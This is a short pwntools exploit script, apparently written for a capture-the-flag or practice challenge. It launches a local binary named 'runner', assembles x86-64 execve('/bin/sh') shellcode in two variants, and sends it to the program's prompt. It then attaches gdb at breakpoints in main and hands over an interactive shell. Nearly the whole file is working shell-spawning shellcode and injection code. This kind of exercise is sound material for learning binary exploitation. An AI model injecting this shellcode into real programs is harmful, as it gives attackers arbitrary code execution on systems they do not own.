# !/usr/bin/python3
from pwn import *


p = process("./runner")

context.arch = "amd64"

binsh = u64(b"/bin/sh\x00")


# Cannot LOAD DIRECT strings into RDI. NEED to load pointer
EXECVE = 0x3B

gdb_script = """
b *main
b *main+100
c
"""

# Push RSP always points to the recently pushed item in stack
# myShellCode = f"""
#     mov rbx, {binsh}
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     push rbx
#     mov rdi, rsp
#     syscall
# """

myShellCode = f""" 
mov rax, {EXECVE}
xor rdx, rdx
xor rsi, rsi
mov rbx, {binsh}
push rbx
mov rdi, rsp
syscall
"""

shellCodeUseStack = f""" 
    lea rbx, [rip + binsh]
    xor rdx, rdx
    xor rsi, rsi
    lea rdi, [rbx]
    mov rax, {EXECVE}
    syscall
binsh: 
    .string "/bin/sh"
"""

payload = asm(shellCodeUseStack)
print(disasm(payload))


p.sendlineafter("that", payload)

gdb.attach(p, gdbscript=gdb_script)


p.interactive()
